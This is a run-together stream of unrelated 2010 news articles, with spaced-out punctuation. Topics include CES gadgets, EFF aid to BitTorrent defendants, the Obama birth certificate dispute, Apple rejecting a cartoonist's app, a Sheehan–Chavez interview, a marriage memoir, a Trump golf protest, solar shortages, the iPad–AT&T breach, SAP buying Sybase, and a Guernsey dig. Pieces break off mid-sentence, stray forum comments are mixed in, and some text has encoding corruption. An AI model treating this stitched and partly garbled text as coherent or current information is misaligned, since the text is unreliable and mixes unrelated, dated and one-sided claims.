This new computing class looks to address both of these issues with lightweight devices that feature desktop - like interfaces and always - on Internet via 3G mobile networks .
Some notable devices unveiled in this category include Lenovo 's Skylight Smartbook , which will be sold through AT&T , the Skiff Reader , which will be sold through Sprint , and a to - be - named HP tablet computer , shown off briefly by Ballmer .
The overarching theme of all of these devices is clear : providing a better user experience that revolves around an always connected lifestyle .
On the road
At this point you might be thinking that " going for a drive " might be your last escape from the digital world .
Think again .
Ford ( yes , the car company ) made one of the biggest splashes at CES , unveiling an update to its SYNC technology called MyFord Touch that lets you turn your car into a wifi hotspot and even connects its radio with iTunes .
Much in the same way Internet connected TVs let you find entertainment , the idea behind connecting your car to the Web is to let you perform functions specific to being on the road .
Using your voice and a built - in touch screen , you 'll soon be able to get driving directions , listen to Internet radio , and perform local searches .
The technology will be available on the 2011 Ford Edge , 2012 Ford Focus , and on all new Lincoln models starting next year .
What it means
Ten years from now , this year 's CES probably will not be remembered for the launch of any one gadget .
However , it was representative of what the next 10 years will look like , with the Internet becoming as ubiquitous as electricity and new gadgets and wares being judged largely on the experience they design around it .
If you 're one of the 14,000 + US citizens targeted by the US Copyright Group for allegedly sharing movies with BitTorrent , a letter has already arrived or will do so shortly .
That letter will contain a polite request : pay us around $ 1,500 within the next few weeks or run of the risk of a federal copyright lawsuit , where lawyers will demand the maximum $ 150,000 penalty .
We 've heard from many readers in this position , most confused about how to proceed ( and many claiming bafflement and total ignorance of the charges ) .
Should they try to quash the initial subpoena ?
If so , what should they say ?
Do they need to hire a lawyer ?
And can the lawyer be local , or does she need to practice in Washington , DC , where these cases have all been filed ?
The Electronic Frontier Foundation has tried to help those in this situation by organizing willing groups of local lawyers around the country .
The EFF made that list public today ; if you need help , this is a good place to start .
Be aware , though , that the lawyers are n't offering free services .
" Because so many people need legal help , and usually on a very short time frame , the following attorneys have offered to assist those targeted to understand their options and may , if necessary , file a motion to quash or litigate on their behalf , " wrote Eva Galperin of the EFF .
" The attorneys on this list are not affiliated with the Electronic Frontier Foundation in any way and by offering their names EFF does not intend to give any individual endorsement of them .
Fees are negotiable on a case by case basis . "
None of these cases have yet proceeded to trial ; many ISPs are still in the process of looking up IP addresses and turning them over to the plaintiffs .
Those who have sought to quash these subpoenas have , almost without exception , filed badly argued , hand - crafted legal documents that are routinely denied ( we 've seen only one successful Motion to Quash , and it was based on a technicality that looks unlikely to be repeated ) .
But the EFF 's most important work may not focus on individuals at all .
The group joined forces with Public Citizen and the American Civil Liberties Union to file a " friend of the court " brief in several of these cases recently that goes right to the heart of the plaintiffs ' litigation strategy .
EFF asked the court to " sever " these lawsuits into hundreds or thousands of individual cases , making them much more difficult and expensive to bring in bulk ; one federal judge has already demanded that the plaintiffs respond to this argument .
A brand - new chapter dawns in the birther controversy over President Obama 's hidden birth certificate .
The Hawaii legislature has now officially passed a measure that would allow state officials to legally ignore each month 's dozens of repeated requests by persons or organizations seeking to see the infant Obama 's actual birth certificate .
For personal privacy reasons the certificate resides under government lock and key in Hawaii and , as is his right , Obama has never authorized its release .
That 's a refusal that has only inflamed conspiracy theorists who theorize that if it 's really legit , what 's Obama 's problem with disclosing it ?
The repeated non-response of spokesmen has been that 's a silly issue .
Nearly three years ago at The Ticket 's request , the presidential campaign of Barack Hussein Obama released a copy of his Certificate of Live Birth , which we promptly published right here .
In the ensuing months , however , that proved insufficient evidence for those who believe the twice - sworn 44th president might possibly maybe could have been born in Kenya , which could mean that he was n't born an American even though his Kansas - born mother was American , which then still conceivably might possibly mean that Obama is an illegitimate president , as is , then , everything he 's done since Jan. 20 , 2009 , they hope .
They want to see the real document .
Twice since then ( click here to see Ticket proof ) the director of Hawaii's State Department of Health , Chiyome Fukino , has issued official statements that she has personally and with ....
Apple rejects Pulitzer winner 's iPhone app because it ' ridicules public figures '
A Pulitzer Prize can win you a round of applause in a newsroom , but it wo n't necessarily get your application in Apple 's App Store .
Freelance artist Mark Fiore , winner of the 2010 prize for editorial cartooning and the first online - only recipient of a Pulitzer , found that out in December .
This story surfaced yesterday , when the Nieman Journalism Lab blog ( a product of Harvard University 's Nieman Foundation ) reported on Fiore 's computing rejection in a piece about his critical success .
Author Laura McGann wrote that Apple refused to list an iPhone program presenting Fiore 's animated cartoons because ... well , they were mean to name - brand people .
She quoted an Apple e-mail forwarded by Fiore :
We 've reviewed NewsToons and determined that we cannot post this version of your iPhone application to the App Store because it contains content that ridicules public figures .
The message cited Section 3.3.14 of Apple 's iPhone Developer Program License Agreement -- although Apple has n't published it , the Electronic Frontier Foundation recently obtained a copy -- which bans things that " in Apple 's reasonable judgment may be found objectionable . "
In a phone call Thursday night , Fiore confirmed that account , said he uses Apple 's products , pointed out that the iPhone 's YouTube program plays Fiore 's animated cartoons on his YouTube channel ( Apple employees may also know them from the San Francisco Chronicle 's site ) , and called Apple 's actions " un - Apple - like " while comparing them to the dystopian vision of its " 1984 " commercial .
Then Fiore said he'd gotten a call from an Apple employee who hinted that if he re-submitted his app , he might find it would get a more hospitable reception .
That would n't surprise me ; Apple has a history of backing down once its App Store gatekeepers ' conduct sees daylight .
An Apple publicist said she would forward a query about this to representatives working on the App Store , but none have replied yet .
I 'll update the post whenever they do .
This escapade raises an interesting question , one that media critic and tech writer Dan Gillmor has been asking for a while :
Now that many news organizations use iPhone applications to publish their work , can Apple evict those programs if it does n't like their content ?
What about , say , The Post 's own iPhone app , which presents the often - scornful work of such colleagues as Dana Milbank and Tom Toles ?
( After one reader raised the same point in comments here , I waved off his concerns .
That 's not looking like a good call . )
When I asked whether The Post 's app could be yanked for featuring " objectionable " content , Washington Post Co. spokeswoman Kris Coratti suggested I first ask Apple for comment .
A developer of The Post 's app did n't want to speak on the record .
But there may be one way to test that theory .
A Post writer could denounce Apple 's conduct and then ridicule a public figure -- perhaps one connected to the Cupertino , Calif. , company -- in a piece that is then distributed via the Post 's iPhone app .
Here goes ...
Ridiculing public figures is the birthright of every American citizen , enshrined in the First Amendment .
Brave men and women have shed blood to defend that freedom , one we celebrate every time we boo a politician who can't keep an opening - day pitch out of the dirt .
Apple once professed to speak for people who " think different " and , presumably , appreciated that right .
Now , though , Apple chief executive Steve Jobs apparently thinks it 's Apple 's job to comfort the comfortable , sparing them the indignity of being mocked in a smartphone application .
Since when is that Apple 's work ?
Since when should it be any self - respecting , red - blooded capitalist 's job ?
You have to ask :
Why does Steve Jobs hate America ?
Okay , Apple : Ball 's in your court .
Anybody want to wager on the fate of the Post 's iPhone app ?
I 'm taking bets in the comments .
Listen to Cindy Sheehan ’s interview with Hugo Chavez :
Cindy Sheehan : President Chavez , thank you for allowing the truth to be told about Venezuela , and about you and your revolution .
Before the revolution , Venezuela was a nation ruled and used by the oligarchy .
How did the revolution begin and how has it remained relatively peaceful ?
President Hugo Chavez ( HC ) : Thank you Cindy , for your efforts to find out our truth , we wish you luck in your struggles , which we share , against war , for peace , for justice , for freedom and equality , against imperialism .
We accompany you in those struggles , you and the people of the US .
The bourgeoisie of Venezuela dominated the country for more than 100 years , with force , with violence , through persecution , assassination , forced disappearances .
Unfortunately the history of Venezuela is a history with a lot of violence .
Violence of the strong against the weak .
In the 20th century in Venezuela , dominated by the oligarchy and the bourgeois state , a reverse miracle happened .
Venezuela was the top exporter of oil from the 1920s until the 1970s , and one of the largest producers of oil in the world throughout all of the 20th century .
But when the century ended , Venezuela had more than 70 % poverty and 40 % extreme poverty , misery .
That generated a violent explosion — all explosions are violent .
An explosion of the poor to liberate themselves .
We were just remembering the anniversary of Caracazo a few days ago , on February 27 , you were there with us , with our people .
Twenty - one years ago the people awoke and arose in a big explosion .
And us in the military were used by the bourgeois state to massacre the people — women and children — and that awoke a consciousness and a pain in the military , and led us to join with the people .
We later led two rebellions .
Our revolution is n’t exactly peaceful .
It ’s relatively peaceful .
The violence of the revolution appears to have come from the counterrevolution .
The Bolivarian Revolution has transferred power and wealth to the people and has been an inspiration and at the same time has been relatively peaceful .
HC : Yes , we got to power in a peaceful way .
And we have been able to maintain it , relatively .
We ’ve never used violence , the counterrevolution has used it against us .
So the central strategy of our peaceful , socialist revolution is to transfer power to the people .
I ’m sure you ’ve been able to see some of it with your own eyes in the neighborhoods of Caracas .
We are engaging in immense efforts to help the people be sovereign .
When we talk about power , what are we talking about , Cindy ?
The first power that we all have is knowledge , so we ’ve made efforts in education , against illiteracy , to promote the development of thought , study , analysis , in a way that has never happened before .
Today , all of Venezuela is a giant school .
Children and senior citizens , all of us are studying and learning .
Then there is political power , the capacity to make decisions — Community Councils , Communes , People ’s Power , grassroots movements .
We have economic power , transferring economic power to the people , distributing the wealth to the people .
That is the principal force that guarantees the Bolivarian Revolution will continue to be peaceful .
Why do you think the Empire makes such a concerted effort to demonize you ?
HC : There are several reasons , but I have come to the conclusion that there is one major reason .
The Empire is afraid .
The Empire is afraid that the people of the US will find out the truth and something could erupt in their own territory — a Bolivarian movement , a Lincoln - esque movement .
A movement of citizens , conscious citizens that seek to transform the system .
Imperial fear killed Martin Luther King , Jr. The only way to stop him was to kill him .
Then , they repressed the citizens of the US .
So , why do they demonize us ?
They know the truth , but they fear the truth .
They fear the contagious effect .
They fear a revolution in the US .
They fear an awakening in the US .
One of the biggest names they call you in the US is dictator .
Can you explain why you are not a dictator ?
HC : I am against dictatorships .
I ’m an anti-dictator .
From a political point of view , I ’ve been elected four times by popular vote .
In Venezuela , we have elections all the time .
Once , Lula , the President of Brazil , said that in Venezuela there is an excess of democracy !
Every year there are elections , referendums , popular consultations , elections for governors , mayors — right now we are starting campaigns for elections in the National Assembly .
In 2012 , there will be presidential elections .
What dictator is elected so many times ?
What dictator calls for elections all the time ?
I ’m an anti-dictator .
I ’m a revolutionary .
A democratic revolutionary .
You ’ve announced your candidacy for the 2012 elections .
You ’ve come a long way but there ’s still a long way to go .
What do you think still needs to be accomplished in Venezuela ?
HC : To tell you in a mathematical way , with everything we ’ve done in education , healthcare , infrastructure , housing , employment , social security , etc. , and in the context of everything we want to do , we ’ve achieved about 10 % .
It ’s been 200 years of abandonment .
The people have been abandoned .
And all the wealth of the country was in the hands of the oligarchy .
So , we have to work really hard .
There is still a lot to do to achieve Bolivar ’s dream .
Simon Bolivar taught us that the best government is one which gives the people the largest amount of happiness .
That is our goal .
A couple of weeks ago in the US , a man flew his airplane into a tax building in Austin , Texas .
Did you hear about that ?
There ’s a lot of that frustration in the US , but instead of flying planes into buildings we should find each other and organize .
The US is a system for the elite , ruled by the elite , a coporacracy .
Can you give us some words of inspiration to help us have the courage to make true revolutionary change ?
HC : We were the same , dominated , persecuted , and there was a lot of desperation , just like that man who flew the plane into the building .
There was a lot of that , a lot of suicidal tendencies , but that ’s not the path , the path is consciousness , an awakening of consciousness .
We had our own experiences , a lot of us died as well , and went to prison .
That ’s why what you are doing is the right thing .
The path is not to fly a plane into a building , it ’s to create consciousness , and then the rest will come on its own .
I ’d like to take this moment to say hello to the people of the US .
We in the South have a lot of faith that the people of the North are going to wake up , just like you have awoken .
We can do great things in the US , make great changes , and in a peaceful way , I hope .
Because the future of the world depends on what happens in the US .
I think that despite everything , the people of the US , in the depth of their hearts , know how to appreciate the difference between truth and lies .
They call us anti-US leaders , but we ’re not !
We ’re anti-imperialist .
We love the people of the US , we love humanity .

When Laura Munson 's husband told her that he did n't love her any more and wanted out , she simply decided she would n't let him go .
She talks to Amanda Mitchison
One fine June day , in the mountains of Montana , Laura Munson 's husband said to her , " I do n't love you any more .
I 'm not sure I ever did .
I 'm moving out .
The kids will understand .
They 'll want me to be happy . "
What is the normal reaction to this kind of announcement ?
You can sob and wail and get down on your knees and beg .
Alternatively , you can pick up the meat cleaver and , when the car skids off down the driveway , cut the crotch out of all his suits .
But Munson did none of these things .
She was n't going to let him get away with this .
She said , " I do n't buy it . "
Guardian Imaging Department
He apparently looked most surprised .
Then he probably narrowed his eyes – for the next thing he said was , " I do n't like what you 've become . "
At this point , Munson says , " a shroud of calm enveloped me " .
She thought , " It 's just words . "
Sticks and stones .
Again she said , " I do n't buy it . "
Then she added , " It 's not age - appropriate to expect children to be concerned with their parents ' happiness …
There are times in every relationship when the parties involved need a break .
What can we do to give you the distance you need , without hurting the family ? "
He said , " Huh ? "
She said , " Go trekking in Nepal .
Build a yurt in the back meadow .
Turn the garage studio into a man-cave .
Get that drum set you 've always wanted .
Anything but hurting the children and me with a reckless move like the one you 're talking about . "
Then she said again , " How can we have a responsible distance ? "
He said , " I do n't want distance .
I want to move out . "
Guardian Imaging Department
She Googled " responsible separation " on the computer , and printed off a list of FAQs about the sharing of keys , credit card access , pets , etcetera .
Appalled , he snarled , " I see what you 're doing .
You 're going to make me go into therapy ! "
She said , " I just asked : what can we do to give you the distance you need ? "
Do you want to know what happened next ?
Are you gripped ?
America certainly is .
Munson 's book , This Is Not The Story You Think It Is… A Season Of Unlikely Happiness , is now a publishing phenomenon in the US .
She has been interviewed by ABC News on Good Morning America and you can see her on YouTube : a picture of all - American wholesomeness – pretty , round face , perfectly aligned teeth , long , glossy brown hair .
She claims to be handy with a chainsaw and is used to hauling 1,500 lb horses into trailers .
You do n't doubt it .
When we talk , it 's 9am in Montana and Munson is sitting with a cup of tea and a view of pines and firs and mountains in the distance .
She has got the kids off to school and needs the rest : she is just back from a three - week book tour .
The offers are pouring in – China and Taiwan have bought the rights , the German contract is being negotiated .
Things have n't always been so professionally rosy .
Before this book , Munson wrote 14 novels that have never been published .
Lesser mortals would have given up , but Munson just developed armadillo hide for skin .
" Yeah , " she says .
" As a writer , you spill out your guts and care so much about it and you send it off and you get back [ the letter saying ] , ' This does not meet our needs at this time . '
So when your husband says , ' You do not meet my needs at this time ' , you say , ' OK , those are just words .
I know how to deal with that . ' "
We return to that fateful morning .
It seems pretty simple .
She said , " No , you ca n't go , but I can give you a long lead " and eventually he said , " Oh , all right then . "
" It 's not like I handcuffed him to a chair , " Munson says .
" I just did n't take it personally .
People in crisis say all sorts of things . "
Surely it must have been incredibly annoying , having someone staying completely calm and saying , " Do you need a bit of distance ? "
Munson replies , " Well , then he can't play victim .
He has to be responsible for his own wellbeing .
When you do n't engage in the drama , it bounces back to the person who flung it in the first place . "
In her writing , Munson uses the analogy of a child having a tantrum .
The child shouts that they hate you .
Do you join in ?
Do you answer back ?
Of course you do n't .
It 's their problem , not yours .
You ignore the tantrum and walk away , even if the toddler 's teeth are still clamped around your arm .
She says carefully , " I 'm not saying my husband was being a child . "
His spiritual malaise was profound – a personal crisis triggered by the failure of his business – and he was n't merely throwing a tantrum .
Of course , nobody would dream of saying thwarted middle - aged men behave like toddlers – perish the thought – but when a toddler is out of sorts , you give them " time out " .
And that is precisely what Munson offered her husband .
So that summer , instead of moving out – the credit card list seemed to have frightened him – Munson 's husband did what he was told and took " time out " .
Effectively he went awol .
He came home late , if at all .
He would n't call .
When he was at home , he was distant , making zero eye contact except for occasional , discombobulating moments when he desired intimacy .
He forgot her birthday and went to someone else 's 4th of July party .
And he went walkabout .
Like an old bear , he retreated into the forest .
" He spent a lot of time at a friend 's fishing lodge .
He 'd take three or four days away . "
And what did she do ?
" We live in such a beautiful part of the world and it was summertime , so the kids were out of school [ Munson 's daughter was then 12 and her son eight ] and there was a lot of being with them in nature .
There was more writing , more getting on my horse .
I did grounded stuff : cooking , gardening .
I was incredibly calm .
That was a summer of unlikely happiness .
I do n't mean ' blissed - out ' happiness , but sometimes happiness is just one little step outside of suffering .
For me , that summer was a very calm , grounded time full of deep breathing . "
But here there is a little pause , and she adds : " And inner tantrums .
Believe me .
When I was out alone in the woods , I was screaming at trees and crying and galloping my horse as fast as I could and diving into freezing mountain lakes .
" Of course you think , ' Is there another woman ? ' , ' What sort of role model am I being ? ' , ' How much longer can I put up with this ? '
This is a man I love and is a great father … and suddenly he is being a completely different person .
We all have these destructive thoughts in our head .
In the book I name them ' my evil twin sister Sheila ' .
I have no idea where I came up with that – probably a soap opera from the 80s . "
Yet in front of her husband and children , Munson remained composed .
Indeed , it is her unusual composure in the face of marital crisis that seems to have caught the public imagination , provoking a flurry of debate .
Some see her as a Gandhi - like figure , others as a doormat , still others as " passive aggressive " .
Time ran a story on How To Save Your Marriage By Not Doing Anything , while the Newsweek headline read When Divorce Is n't The Only Choice .
Munson is being held up as a role model for a radical new relationship dynamic , but can anyone else learn from her experience ?
Marriage gurus point out that there are different kinds of relationship breakdown – long , corrosive ones – that might be beyond repair , and sudden crises that could benefit from a Munson - style stonewalling .
For all her slightly new age references and talk of deep breathing and eternal wisdom , Munson is , in fact , advocating rather old - fashioned values : stoicism , loyalty , self - control , reticence , discretion .
To her credit , her children remained more or less unaware of what was happening that summer ( though they can't be now ) .
She was also careful in whom she confided : " I did n't share it with many people .
I chose friends who loved my husband and believed in us , not friends who'd say , ' Kick him out ! '
People love a drama , and a drama does n't necessarily serve anyone or anything . "
What Munson believes helped her cope and see what was happening to her husband was the fact that , two years earlier , she had undergone her own personal crisis .
In a short space of time , her first big publishing deal had folded , her father died suddenly and her dog was shot .
" I was miserable .
Suffering had become my norm .
And that 's when I hired a good therapist . "
The therapist helped her revaluate her priorities , learn to embrace the present and not judge herself by worldly success .
Armed with this wider perspective – and the 14 novel - thick armadillo skin – she was prepared for anything .
In fact , she says , the marital crisis was grist to the mill : " I like to say I had the map and he gave me the territory . "
It was , for all the suffering , an oddly exhilarating experience .
Munson had set herself a six - month limit for her husband 's " time out " .
But a family tragedy made him start to sort himself out a little sooner .
" His sister got cancer and her husband had just left her and she had five children and she actually died last 4 July .
Midway through that summer , he went to live with her and help her , and I think it was that experience of seeing somebody he loved so dearly lose their life at such a young age .
He began to understand what was really important was n't his job .
It was his relationships . "
The day he came home from that visit to his sister , " I was in the hot tub , and he came out and got in and he said , ' I just have to apologise for everything I have put you through this summer , and I can never repay you .
I am a 40 - year - old trying to be a 20 - year - old , and I realise my career is done with and I have to find something else . "
Other encouraging signs followed : he started fixing broken doorknobs , and murmuring about repainting the porch , and getting logs in for the winter .
Then came the clincher : " One day I came home and there was a satellite truck in our driveway .
I thought , ' Huh !
This guy is getting the satellite upgraded .
He might mow the lawn and not come back .
But a guy that has ordered more sports channels – he is not going anywhere ! "
And he stayed .
By Thanksgiving 2008 , the crisis was over .
Now they are back together and he has found a job .
" Of course , " she adds , a little tartly , " at the end it is not all tied up in a perfect pink bow . "
And the moral of it all ?
Her book is not , she insists , a guide on How To Keep Your Man .
On the contrary : " It 's all about letting go .
Suddenly , the minute I let go of ever getting published , and of my marital outcome , that is when everything turns round .
I find that incredibly interesting . "
• Laura Munson's This Is Not The Story You Think It Is… A Season Of Unlikely Happiness is published in the US by Amy Einhorn Books / Putnam .
Opponents of Donald Trump 's proposed £ 1bn golf resort in Aberdeenshire claim they have thwarted his plans to forcibly purchase land in a mass protest backed by celebrities and conservationists .
Scores of people including comedian Mark Thomas and mountaineer Cameron McNeish have been made joint owners of one acre of land previously owned by Michael Forbes , the quarryman and salmon netsman who has become Trump 's most famous opponent .
The land is part of Forbes 's 23 - acre property which sits inside the proposed resort close to one of two planned 18 - hole golf courses and , in a play on words , has been nicknamed The Bunker .
Campaigners in the protest group Tripping up Trump today unveiled an online appeal for sympathisers to register their names as joint owners , in a campaign likened to the mass purchase of land next to Heathrow to block the airport 's third runway .
Although Trump has said Forbes 's home is not necessary for his resort , the billionaire property developer 's executives have said he could seek the compulsory purchase of Forbes 's land and three other private houses and properties inside or next to the site .
Trump , who flew into Aberdeen today with his son Donald Trump Junior , already has outline planning permission for these properties .
His latest masterplan included all five parcels of private property in the resort .
Two property owners , a driving school instructor who lives next to Forbes and Aberdeenshire council , have indicated they want to sell to Trump ; Forbes and David Milne , another prominent objector who owns an adjacent former coastguard station , are resisting the measure .
His opponents are convinced Trump will seek their compulsory purchase order and believe their mass ownership of part of the land will make it legally and politically difficult for Aberdeenshire council to agree to the order .
Forbes , made famous after Trump singled him out for abuse in 2009 , said : " Tripping Up Trump now own a piece of my land in an effort to help protect my family and the other families worried by the threat of compulsory purchase .
Trump lost the battle for public opinion long ago , and he's now lost any chance of bulldozing our homes . "
The group 's solicitor , Eileen Bready , added : " The Tripping up Trump campaign has now acquired land at Mill of Menie to defend the homes under threat of compulsory purchase .
The Trump Organisation will now have to deal with many more objectors than they anticipated . "
Other co-owners of the one acre site include Dr Adam Watson , the ecologist and expert on the Cairngorms ; Paul Young , the actor and presenter ; Ed Wardle , the adventurer who recently made a survival series in the Canadian wilderness ; Scottish Green party MSP Robin Harper ; other residents threatened by compulsory purchase ; and Tripping up Trump activists .
In a statement , Watson said : " I 've decided to help prevent Aberdeenshire folk from the harassment and threat of removal from their homes , merely to satisfy a private developer who asserts he now wants the land . "
Thomas said : " If Aberdeenshire council does the bidding of a US billionaire to turf people off their land they are nothing but lackeys and clerks for the golfing clearances . "
Trump has said he wants to create " the world 's greatest golf course " on the stretch of coastline , part of which is a legally - protected conservation area of rare and valuable sand dunes .
Solar Shortages Looming With Boom in Worldwide Demand
June 5th , 2010 by Susan Kraemer
First Solar , the world ’s cheapest solar panel maker , is reporting that they cannot meet this years demand for solar panels , and three more major manufacturers ; Suntech , Yingli and Trina are also signaling that they are sold out , according to Reuters .
This is a huge turnabout .
It is only a year ago that solar panels flooded the global market , driving down the cost of solar installations worldwide , after Spain suddenly eased off on its generous Feed - in Tariff , leading to a worldwide solar panel glut and a resulting 40 % drop in panel prices .
[ social_buttons ]
The benefits of that suddenly cheap solar has had a huge impact .
California alone installed as much solar in the first three months as it did in all of last year , at least in part due to cheap panels .
But now it appears that prices might rise again , due to ricocheting demand .
First Solar is having to postpone projects in the United States to meet demand in Europe , supplying growing markets in France , Spain and Italy , as well as in China and Australia .
As we enter the Peak Oil years and start the very bumpy slide down the other side of Hubbert ’s Peak , this kind of increased competition for all sources of energy is increasingly likely .
If you have been on the fence about getting your own solar , whether you ’ve been procrastinating on buying solar , or just signing up for power by the kilowatt - hour – it is clearly time to move fast before prices skyrocket … or lose out .
And when you do grab that forty - year supply of your own energy – do n’t forget to include some additional electrons to charge that new electric vehicle that will keep you flying free on future freeways while others sputter along on the last drops of dangerous and dirty oil .
Solar estimators say for every 10,000 miles that you ’ll drive annually , you should plan on including about 250 extra kilowatt - hours a month for charging an electric car .
So , if you drive 5,000 miles annually , you ’d need 125 kilowatt - hours a month to power that Volt , LEAF , TH!INK , or whatever , or about as much as to power a swimming pool pump .

This show is merely a sensationalist piece of crap , no real justice gets done in there , and she 's no real judge .
Even if they obtained actual certification for her , her attitude is not one that would merit any respect .
But like everyone else has already stated , yes , renting to own is a very bad idea .
Security experts have begun parsing the blame for the iPad - AT&T security breach that exposed the email address of some high - profile users .
Meanwhile , the FBI has launched an official investigation of a caper in which the perpetrators — greyhat researchers calling themselves Goatse Security – Ã‚ Â freely claim responsibility for the attack .
“ We believe what we did was ethical , ” Goatse member Escher Auernheimer told PC World ’s Greg Keizer in a telephone interview .
“ What we did was right . ”
Auerheimer notes thatÃ‚Â Goatse waited until AT&T had closed the hole beforeÃ‚Â outing the e-mail addresses it had grabbed .
This , he contends , amounts toÃ‚Â “ responsible disclosure . ”
Going public with the discovery of a fresh security hole is one thing .
But actually taking advantage of the vulnerability to steal data is another .
Pierce the privacy of high - powered , well - connected iPad users , and you wake the sleeping giant : the FBI .
“ The disclosure was completely irresponsible , ” says Sean Sullivan , Security Advisor , at antiviurus company F - Secure .
“ There is no reason why the Goatse Security group needed to harvest data .
They only did it to sensationalize the issue and they are guilty of violating personal privacy . ”
Celebrity quotient
Goatse researchers claim to have extracted 114,000 e-mail addresses , including many high profile celebrities , athletes and politicos , New York City Mayor Michael Bloomberg , White House Chief of Staff Rahm Emanuel , and movie producer Harvey Weinstein , among them .
They did this by tricking AT&T ’s servers into divulging the correct unique identifier for the iPad and associated e-mail addresses .
The incident , no doubt , has worsened the already strained relationship between AT&T and Apple , says Rick Munarriz , senior analyst at The Motley Fool .
i Phone and iPad users have complained about dropped calls , poor signals and expensive usage rates , notes Munarriz .
Jon Heimerl , Director of Strategic Security at Solutionary , a data security consulting company , believes AT&T is largely at fault for this latest stumble .
“ In no way is this an ‘ iPad breach , ’ ” says Heimerl . ” This was someone grabbing information off of an AT&T server that was accidentally left exposed to the Internet . ”
Hemanshu Nigam , founder of security consultancy SSP Blue , says Apple bears the largest share of culpabibility since it set the authentication requirements ATT was required to follow .
“ This is exactly where the flaw existed , ” says Nigam , former security chief at MySpace .
“ Apple needs to start putting user security ahead of user convenience .
The hacker community is obviously gearing up to dethrone the king and this is just another warning shot . ”
More iPad attacks likely
Heimerl and Nigam do agree on this point : wider use of iPads , especially among movers and shakers , portends intensified hacks — by professional cybercriminals , not just security researchers looking to grab headlines .
“ The iPad is a new product , and as such likely has unintended ( security weaknesses ) built in . ” says Heimerl .
“ Odds are that someone will find something to hack in the device operating system , or in one of the primary applications that the iPad runs , like the Safari browser . ”
Although email addresses in and of themselves may seem low value , “ knowing these addresses opens them up to a large number of spammers and would - be social engineers that will now be checking every login field on the internet for accounts belonging to them , ” says Jason Haddix , Security Engineer at Redspin .
Sam Diaz , senior editor at ZDNet , calls out Mayor Bloomberg and Ã‚Â Chief of StaffÃ‚Â Emanuel , for owning iPads in the first place .
” What I would really want to know – given the volume of government officials whose official work e-mail addresses were found . . . is exactly who paid for all of these iPads that are reportedly in the hands of so many people in Washington , Diaz writes in this post .
“ Last time I checked , the iPad was a pretty expensive device , especially for government agencies that probably have better uses for government dollars other than to buy iPads . ”
i Pad best security practices
In wake of the breach , Rescuecom CEO David A. Milman suggests these precautions for iPad users :
Turn off the 3G Network .
AT&T has stated that there is no more threat to customers .
However , turning off 3G wireless Internet service , at least temporarily , will protect an individualÃ¢â‚¬â „ ¢s personal data from any further attack .

Request a new SIM from AT&T .
The ICC - ID number that the hackers breached is attached to each userÃ¢â‚¬â „ ¢s SIM , the card linking an individual iPad to its user .

Limit iPad usage .
Using the iPad is , most likely , still safe .
However , to best protect personal data , users should be careful what they use the iPad for .
Avoid tasks such as mobile banking or anything that transmits personal information , especially when on a 3G network .
For those consumers who have not yet purchased an iPad , but were considering it , Milman recommends waiting at least six months for the manufacturer to work the major bugs out of the system .
Ã¢â‚ ¬Å“ While most everyone is aware that security is important , very few of us understand what goes into securing the software , hardware , and networks that contain our most valuable asset , our identity , ” says Milman .
“ AT&TÃ¢â‚¬â „ ¢s breach is a perfect example of how at risk we are .

SAP is buying mobile and database vendor Sybase for roughly $ 5.8 billion , the company announced Wednesday .
The all - cash offer of $ 65 per share amounts to a 44 % premium over Sybase 's three - month average stock price , according to SAP .
Sybase 's board has voted unanimously in favor of the deal , which requires clearance by antitrust officials , SAP said .
The pending deal would significantly expand the technological portfolio of SAP , which is known most of all for its ERP ( enterprise resource planning ) applications .
" They 're investing in two areas they think will be important for them , " namely mobile technology and in - memory databases , both areas where Sybase is strong , said Ray Wang , partner with Altimeter Group .
In - memory processing is a particular interest of SAP co-founder and chairman Hasso Plattner , who has predicted it will reshape the enterprise application arena thanks to the performance improvement it can provide over databases that must read from and write to disks .
In a statement , SAP said its own in - memory technology would boost the capabilities of Sybase 's database platform .
Meanwhile , the deal raises questions about SAP 's relationships with other mobile technology companies , such as Research in Motion , said 451 Group analyst China Martens via e-mail .
" They made a big deal of when they announced the relationship with Sybase about how it was nonexclusive and how they hold very dear the partnership with RIM , " Martens said .
SAP formed a strategic partnership with Sybase in March 2009 focused on mobile applications .
Sybase 's database is a less common option for running SAP applications in part due to historical compatibility issues with older SAP platforms .
In addition , SAP currently sends lucrative business toward rival Oracle , as it resells the latter 's database .
Those dynamics could change with Sybase 's technology coming under SAP 's roof .
But SAP will also gain a new doorway into financial services , where Sybase has a strong presence .
Both companies ' product road maps will be preserved , as will their development groups , but " the opportunity to cross - collaborate " will be there , SAP said .
Company officials are scheduled to discuss the deal further in a conference call later on Wednesday .
Developing story .
More to come .
that must have been quite the moment to stand there in front of your character and look up to him
saw a trailer of Splatterhouse yesterday and it looked like a lot of splattery fun
This is the third time in the last 100 years that the site has been dug up A Neolithic burial site in the parish of St Sampson has yielded pottery fragments and flints that date back 4,500 years .
They were discovered in a gallery grave , which lies within Delancey Park .
Evidence has also been found of related structures that were previously unknown to archaeologists .
The finds were made during a preliminary examination of the site in June 2010 .
More extensive excavations are due to take place in 2011 .
The leader of the project , Dr George Nash , said they had already made important progress .
Finds from the 2010 dig included a fragment of a knapped flint hand tool
He said : " We 've found some quite significant archaeology .
We 've started to find structures that come away from the main gallery grave and we also have artefacts .
" So far the results have been quite spectacular . "
The Delancey Park structure is Guernsey 's only gallery grave , while there are two to be found in Jersey and more along the Atlantic coast of northern Europe .
Gallery graves belong to the late Neolithic period and are therefore more recently built than the more prevalent ' passage ' graves , such as Les Fouillages and Dehus in the Vale .
The gallery grave lies roughly on an east - west axis Dr Nash explained : " The earlier constructions feature passages leading to an inner space , often with partitioned areas that may denote ' engendering ' - the separate burial of males and females .
" The gallery grave consists of one narrow space of up to 20 metres , flanked by lines of stones outside the main construction .
" These delineate the revered space around the gallery from the ordinary ground beyond . "
The most significant object found on the site during earlier digs was the head of a greenstone axe .
Finds from earlier digs are kept at the Guernsey Museum
It was fashioned from a soft rock and highly polished , perhaps indicating it was a decorative item rather than utilised as a tool .
The first dig at the site in 1919 was controversial .
Some parishioners felt the unearthing of a grave site for scientific research was inappropriate .
A landslip at the nearby Longue Hougue quarry later that year , which led to a loss of life , was thought by some to have been a consequence of disturbing the spirits residing in the ancient site .
Dr Nash stressed the advantages of modern archaeological techniques compared to the methods used during previous digs .
A dig in 1932 was not recorded accurately by modern day standards " If you look at the photographs of the 1932 excavation , it 's very much a sort of dig and prod exercise where they did n't actually remove the stones . "
Guernsey 's archaeology officer Philip De Jersey explained the need to disturb the late Stone Age site for a third time .
He said : " It 's suffered quite badly , particularly in the early twentieth century and it would be a shame to lose any hope of getting what information out of it we can . "
